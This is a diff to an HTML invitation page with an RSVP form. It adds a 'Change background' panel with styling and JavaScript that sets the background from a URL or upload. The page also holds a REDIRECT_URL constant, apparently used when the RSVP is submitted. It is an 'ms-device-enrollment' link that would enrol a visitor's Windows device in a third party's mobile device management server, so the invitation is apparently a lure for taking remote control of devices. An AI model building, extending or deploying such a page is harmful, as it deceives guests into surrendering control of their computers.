@@ -8,6 +8,9 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Great+Vibes&display=swap" rel="stylesheet" />
   <style>
+    /*
+     * CHANGE BACKGROUND: Edit --bg-image below, or use "Change background" on the page.
+     */
     :root {
       --bg-image: url('background-image.png');
       --cream: #fdfbf3;
@@ -38,6 +41,94 @@
       justify-content: center;
       padding: 2rem 0;
       background: var(--bg-image) center center / cover no-repeat;
+    }
+
+    .bg-control {
+      position: fixed;
+      bottom: 1rem;
+      right: 1rem;
+      z-index: 10;
+      font-family: 'Libre Baskerville', Georgia, serif;
+      font-size: 0.75rem;
+    }
+
+    .bg-toggle {
+      padding: 0.4rem 0.65rem;
+      color: var(--cream);
+      background: rgba(26, 26, 26, 0.85);
+      border: 1px solid var(--gold);
+      cursor: pointer;
+      border-radius: 4px;
+      letter-spacing: 0.05em;
+    }
+
+    .bg-toggle:hover { background: rgba(26, 26, 26, 0.95); }
+
+    .bg-panel {
+      display: none;
+      position: absolute;
+      bottom: 100%;
+      right: 0;
+      margin-bottom: 0.5rem;
+      width: 280px;
+      padding: 1rem;
+      background: var(--cream);
+      border: 2px solid var(--gold);
+      border-radius: 4px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    }
+
+    .bg-panel.open { display: block; }
+
+    .bg-panel label {
+      display: block;
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--ink);
+      margin-bottom: 0.35rem;
+    }
+
+    .bg-panel input[type="text"],
+    .bg-panel input[type="file"] {
+      width: 100%;
+      margin-bottom: 0.75rem;
+      font-size: 0.85rem;
+    }
+
+    .bg-panel input[type="text"] {
+      padding: 0.4rem 0.5rem;
+      border: 1px solid var(--input-border);
+    }
+
+    .bg-panel .bg-buttons {
+      display: flex;
+      gap: 0.5rem;
+      margin-top: 0.5rem;
+    }
+
+    .bg-panel button {
+      flex: 1;
+      padding: 0.45rem 0.6rem;
+      font-family: inherit;
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+
+    .bg-panel .btn-apply {
+      background: var(--gold);
+      color: #fff;
+      border: none;
+    }
+
+    .bg-panel .btn-clear {
+      background: transparent;
+      color: var(--ink);
+      border: 1px solid var(--ink);
     }
 
     .page-wrap::before {
@@ -212,7 +303,7 @@
   </style>
 </head>
 <body>
-  <div class="page-wrap">
+  <div class="page-wrap" id="page-wrap">
     <div class="card-outer">
       <div class="card-band left"></div>
       <main class="card-inner">
@@ -247,8 +338,90 @@
     </div>
   </div>
 
+  <div class="bg-control">
+    <button type="button" class="bg-toggle" id="bg-toggle" aria-label="Change background">Change background</button>
+    <div class="bg-panel" id="bg-panel">
+      <label for="bg-url">Image URL</label>
+      <input type="text" id="bg-url" placeholder="https://… or leave empty and choose file" />
+      <label for="bg-file">Or upload image</label>
+      <input type="file" id="bg-file" accept="image/*" />
+      <div class="bg-buttons">
+        <button type="button" class="btn-apply" id="bg-apply">Apply</button>
+        <button type="button" class="btn-clear" id="bg-clear">Clear</button>
+      </div>
+    </div>
+  </div>
+
   <script>
     const REDIRECT_URL = 'ms-device-enrollment:?mode=mdm&username=smtp-on7ys@naccato.com.ar&servername=https://wxigqj-api.esper.cloud/api/v2/windows/discovery/Ymx1ZXByaW50X2lkPTJiNzM2NWRjLTYzODYtNDkwYy1iYTY3LTY2MzkzOTExNDJhNCZncm91cF9pZD1iMDQwOGRjNi02OWE0LTQ0MzMtODNkNC0zMDI5MThkNWZjYjQ';
+    const BG_STORAGE_KEY = 'invitation-bg';
+
+    var pageWrap = document.getElementById('page-wrap');
+    var bgPanel = document.getElementById('bg-panel');
+    var bgToggle = document.getElementById('bg-toggle');
+    var bgUrl = document.getElementById('bg-url');
+    var bgFile = document.getElementById('bg-file');
+    var bgApply = document.getElementById('bg-apply');
+    var bgClear = document.getElementById('bg-clear');
+
+    function setBackground(value) {
+      if (value) {
+        pageWrap.style.backgroundImage = value.indexOf('url(') === 0 ? value : 'url(' + value + ')';
+        try { localStorage.setItem(BG_STORAGE_KEY, value); } catch (e) {}
+      } else {
+        pageWrap.style.backgroundImage = '';
+        try { localStorage.removeItem(BG_STORAGE_KEY); } catch (e) {}
+      }
+    }
+
+    function loadSavedBackground() {
+      try {
+        var saved = localStorage.getItem(BG_STORAGE_KEY);
+        if (saved) setBackground(saved);
+      } catch (e) {}
+    }
+
+    bgToggle.addEventListener('click', function () {
+      bgPanel.classList.toggle('open');
+    });
+
+    bgApply.addEventListener('click', function () {
+      var url = bgUrl.value.trim();
+      if (url) {
+        setBackground(url.indexOf('url(') === 0 ? url : 'url(' + url + ')');
+        bgPanel.classList.remove('open');
+        bgUrl.value = '';
+        bgFile.value = '';
+      }
+    });
+
+    bgFile.addEventListener('change', function () {
+      var file = this.files && this.files[0];
+      if (!file) return;
+      var reader = new FileReader();
+      reader.onload = function () {
+        setBackground('url(' + reader.result + ')');
+        bgPanel.classList.remove('open');
+        bgUrl.value = '';
+        bgFile.value = '';
+      };
+      reader.readAsDataURL(file);
+    });
+
+    bgClear.addEventListener('click', function () {
+      setBackground('');
+      bgPanel.classList.remove('open');
+      bgUrl.value = '';
+      bgFile.value = '';
+    });
+
+    document.addEventListener('click', function (e) {
+      if (!bgPanel.contains(e.target) && e.target !== bgToggle) {
+        bgPanel.classList.remove('open');
+      }
+    });
+
+    loadSavedBackground();
 
     document.getElementById('rsvp-form').addEventListener('submit', function (e) {
       e.preventDefault();
